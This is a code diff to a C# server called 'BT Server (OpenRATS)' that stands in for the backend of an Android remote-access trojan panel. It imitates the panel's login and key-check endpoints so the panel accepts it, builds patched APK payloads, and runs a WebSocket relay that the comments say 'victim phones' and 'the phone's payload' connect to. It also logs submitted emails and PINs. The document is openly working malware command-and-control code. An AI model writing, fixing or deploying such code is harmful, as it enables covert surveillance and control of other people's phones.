@@ -18,21 +18,23 @@ using System.Text;
 using System.Text.Json;
 using BtServer;
 
+ServerConfig config = ServerConfig.Load();
+// --no-dex-patch: build with the template DEX untouched (diagnostic).
+if (args.Contains("--no-dex-patch")) ServerApkBuilder.SkipDexPatch = true;
 var builder = WebApplication.CreateBuilder(new WebApplicationOptions
 {
-    // default to port 80 so the panel's http://<ip>/yaarsa/... URLs resolve
     Args = args,
+    // Panel URLs are http://<host>/yaarsa/... (port 80) and ws://<host>:8080.
+    WebRootPath = Path.Combine(AppContext.BaseDirectory, "wwwroot"),
 });
+builder.WebHost.UseSetting("urls",
+    $"http://0.0.0.0:{config.HttpPort};http://[::]:{config.HttpPort}");
 
 // ---- configuration ------------------------------------------------------
-ServerConfig config = ServerConfig.Load();
 builder.Services.AddSingleton(config);
 builder.Services.AddSingleton(new Store(AppContext.BaseDirectory));
 builder.Services.AddSingleton<RelayHub>();
 builder.Services.AddControllers(); // not used, but keeps the default pipeline intact
-
-// wwwroot holds /yaarsa/user/storage/ built APKs + icons + login page.
-builder.WebHost.UseWebRoot("wwwroot");
 
 var app = builder.Build();
 Store store = app.Services.GetRequiredService<Store>();
@@ -337,7 +339,12 @@ app.MapPost("/yaarsa/private/yarsap_45071.php", async (HttpRequest req) =>
 // The panel navigates a WebView2 here and auto-fills #email, #password and
 // #bt-key-input, then clicks #login-button. A plain HTML page that performs
 // the same btlogin.php POST keeps that flow working.
-app.MapGet("/yaarsa/user/loginbt3.php", () => Results.Content(LoginPageHtml(), "text/html; charset=utf-8"));
+// NOTE: the panel probes availability with a HEAD request and requires 200
+// (codes.IsUrlAvailable: HEAD + StatusCode == OK). Map GET *and* HEAD, and add
+// a catch-all HEAD below, or the panel reports "server unreachable" even though
+// the real POST login would have worked.
+app.MapMethods("/yaarsa/user/loginbt3.php", new[] { "GET", "HEAD" },
+    () => Results.Content(LoginPageHtml(), "text/html; charset=utf-8"));
 app.MapPost("/yaarsa/user/loginbt3.php", async (HttpRequest req) =>
 {
     IFormCollection form = await req.ReadFormAsync();
@@ -346,14 +353,20 @@ app.MapPost("/yaarsa/user/loginbt3.php", async (HttpRequest req) =>
     string pin = form["bt-key-input"].ToString();
 
     AccountRecord acc = config.FindAccount(email);
-    if (acc == null || !config.VerifyPassword(acc, pass))
-        return Results.Content(LoginPageHtml(), "text/html; charset=utf-8"); // page stays
+    bool ok = acc != null && config.VerifyPassword(acc, pass);
 
-    // Success: redirect into the main site root; the panel detects the
-    // completed navigation and switches to its own WebSocket flow.
-    return Results.Redirect("/yaarsa/user/", permanent: false);
+    app.Logger.LogInformation(
+        "loginbt3 POST: email='{Email}' pass={PassLen}c pin='{Pin}' acctFound={Found} ok={Ok}",
+        email, pass.Length, pin, acc != null, ok);
+
+    // IMPORTANT: return the page with HTTP 200 and DO NOT redirect. The panel's
+    // loader only runs its login logic from mywebview_NavigationCompleted while
+    // the URL still contains "loginbt3"; a 302 to /yaarsa/user/ (different path)
+    // makes it skip the handler and the direct btlogin.php call never fires.
+    string body = ok ? LoginPageHtml(pin, ok) : LoginPageHtml(pin, ok);
+    return Results.Content(body, "text/html; charset=utf-8");
 });
-app.MapGet("/yaarsa/user/", () => Results.Content(
+app.MapMethods("/yaarsa/user/", new[] { "GET", "HEAD" }, () => Results.Content(
     "<html><body style='background:#060a0f;color:#02b075;font-family:Segoe UI;padding:40px'>" +
     "<h2>BT Server (OpenRATS)</h2><p>Logged in. You can close this page and return to the panel.</p>" +
     "</body></html>", "text/html; charset=utf-8"));
@@ -373,6 +386,10 @@ app.UseStaticFiles(new StaticFileOptions
 // ============================================================================
 
 app.MapGet("/admin", () => Results.Content(AdminPageHtml(hub, config, store), "text/html; charset=utf-8"));
+
+// ---- catch-all HEAD: codes.IsUrlAvailable probes with HEAD and needs 200 -----
+// (mirrors GET availability without a body; harmless for any path)
+app.MapMethods("/{**path}", new[] { "HEAD" }, () => Results.Ok());
 
 app.MapPost("/admin/keys", async (HttpRequest req) =>
 {
@@ -486,34 +503,123 @@ app.MapPost("/admin/build", async (HttpRequest req) =>
 
 // ============================================================================
 //  WebSocket relay — ws://<server>:8080
+//
+//  BINDING IS SUBTLE. A non-admin process can only bind prefixes it is allowed
+//  to (loopback, or anything covered by a urlacl). Measured behaviour on this
+//  box:
+//    * no urlacl            -> "http://+:8080/" is DENIED, "http://127.0.0.1:8080/" OK
+//    * urlacl http://+:8080/-> "http://+:8080/" is OK,     "http://127.0.0.1:8080/" DENIED
+//  So the two styles are mutually exclusive and we must pick exactly one set.
+//  "+" is preferred because it also answers on the LAN IP, which is what the
+//  phone's payload dials.
 // ============================================================================
-var wsServer = new HttpListener();
-wsServer.Prefixes.Add($"http://+:{config.WebSocketPort}/");
-_ = Task.Run(async () =>
+var wsServer = StartRelay(config.WebSocketPort, app.Logger);
+if (wsServer != null)
 {
-    wsServer.Start();
-    app.Logger.LogInformation("WebSocket relay listening on port {Port}", config.WebSocketPort);
-    while (true)
+    _ = Task.Run(async () =>
     {
-        HttpListenerContext ctx;
-        try { ctx = await wsServer.GetContextAsync(); }
-        catch { break; }
-        _ = Task.Run(async () =>
+        app.Logger.LogInformation("WebSocket relay listening on {Count} prefix(es), port {Port}",
+            wsServer.Prefixes.Count, config.WebSocketPort);
+        while (true)
         {
-            if (!ctx.Request.IsWebSocketRequest) { ctx.Response.Close(); return; }
-            try
+            HttpListenerContext ctx;
+            try { ctx = await wsServer.GetContextAsync(); }
+            catch { break; }
+            _ = Task.Run(async () =>
             {
-                System.Net.WebSockets.HttpListenerWebSocketContext ws =
-                    await ctx.AcceptWebSocketAsync(null);
-                string ip = ctx.Request.RemoteEndPoint?.Address.ToString() ?? "0.0.0.0";
-                await hub.RunConnectionAsync(ws.WebSocket, ip);
-            }
-            catch { /* handshake failure */ }
-        });
-    }
-});
+                if (!ctx.Request.IsWebSocketRequest)
+                {
+                    app.Logger.LogInformation("relay: non-websocket request {Method} {Url} (upgrade={Upgrade})",
+                        ctx.Request.HttpMethod, ctx.Request.Url, ctx.Request.Headers["Upgrade"]);
+                    ctx.Response.StatusCode = 200;
+                    ctx.Response.Close();
+                    return;
+                }
+                try
+                {
+                    System.Net.WebSockets.HttpListenerWebSocketContext ws =
+                        await ctx.AcceptWebSocketAsync(null);
+                    string ip = ctx.Request.RemoteEndPoint?.Address.ToString() ?? "0.0.0.0";
+                    await hub.RunConnectionAsync(ws.WebSocket, ip);
+                }
+                catch (Exception ex)
+                {
+                    app.Logger.LogWarning(ex, "relay: handshake failed from {Ip}",
+                        ctx.Request.RemoteEndPoint?.Address);
+                }
+            });
+        }
+    });
+}
 
 app.Run();
+
+/// <summary>
+/// Try each candidate prefix set on a FRESH HttpListener and return the first one
+/// that starts. A fresh listener per attempt matters: after a failed Start(),
+/// Reusing one listener and calling Prefixes.Clear() can throw
+/// ObjectDisposedException on some runtimes.
+/// </summary>
+static HttpListener StartRelay(int port, ILogger log)
+{
+    foreach (List<string> set in RelayPrefixCandidates(port))
+    {
+        var listener = new HttpListener();
+        foreach (string p in set) listener.Prefixes.Add(p);
+        try
+        {
+            listener.Start();
+            return listener;
+        }
+        catch (Exception ex)
+        {
+            log.LogDebug("relay: prefix set [{Set}] rejected: {Message}", string.Join(", ", set), ex.Message);
+            try { listener.Close(); } catch { }
+        }
+    }
+
+    log.LogError(
+        "WebSocket relay could NOT start on port {Port}. Victim phones will not connect " +
+        "until this is fixed. Either run the server as administrator, or open the port once with:\n" +
+        "    netsh http add urlacl url=http://+:{Port}/ user=Everyone",
+        port, port);
+    return null;
+}
+
+/// <summary>Prefix sets to try, best first. Each set is all-or-nothing.</summary>
+static IEnumerable<List<string>> RelayPrefixCandidates(int port)
+{
+    // Best: the strong wildcard answers on loopback, every NIC, and the hostname.
+    yield return new List<string> { $"http://+:{port}/" };
+
+    // Fallback for a non-admin process with no urlacl: only loopback works.
+    var loopbackOnly = new List<string> { $"http://127.0.0.1:{port}/" };
+    var local = LocalIPv4Addresses();
+    if (local.Count > 0) loopbackOnly.Add($"http://localhost:{port}/");
+    yield return loopbackOnly;
+}
+
+static List<string> LocalIPv4Addresses()
+{
+    var result = new List<string>();
+    try
+    {
+        foreach (System.Net.NetworkInformation.NetworkInterface nic in
+                 System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
+        {
+            if (nic.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue;
+            foreach (System.Net.NetworkInformation.UnicastIPAddressInformation addr in
+                     nic.GetIPProperties().UnicastAddresses)
+            {
+                if (addr.Address.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
+                string ip = addr.Address.ToString();
+                if (ip != "127.0.0.1" && !result.Contains(ip)) result.Add(ip);
+            }
+        }
+    }
+    catch { /* loopback only */ }
+    return result;
+}
 
 static string Str(JsonElement e, string name)
 {
@@ -544,7 +650,7 @@ static string ServerApkBuilder_RandomToken()
 //  HTML pages
 // ============================================================================
 
-static string LoginPageHtml() => """
+static string LoginPageHtml(string pin = "", bool success = false) => """
 <!DOCTYPE html>
 <html>
 <head>
@@ -560,11 +666,12 @@ static string LoginPageHtml() => """
 <body>
  <div class="card">
   <h3 style="margin-top:0">BT Server (OpenRATS)</h3>
-  <form method="post" action="/yaarsa/user/loginbt3.php">
+  <form id="activation-form" method="post" action="/yaarsa/user/loginbt3.php">
    <input id="email" name="email" type="email" placeholder="Email" autocomplete="off"/>
    <input id="password" name="password" type="password" placeholder="Password"/>
    <input id="bt-key-input" name="bt-key-input" type="text" placeholder="Server key (optional)"/>
-   <button id="login-button" type="submit">Login</button>
+   <div id="smalltag" style="display:none">Your Shadow, Everywhere</div>
+   <button id="login-button" type="button">Login</button>
   </form>
  </div>
 </body>
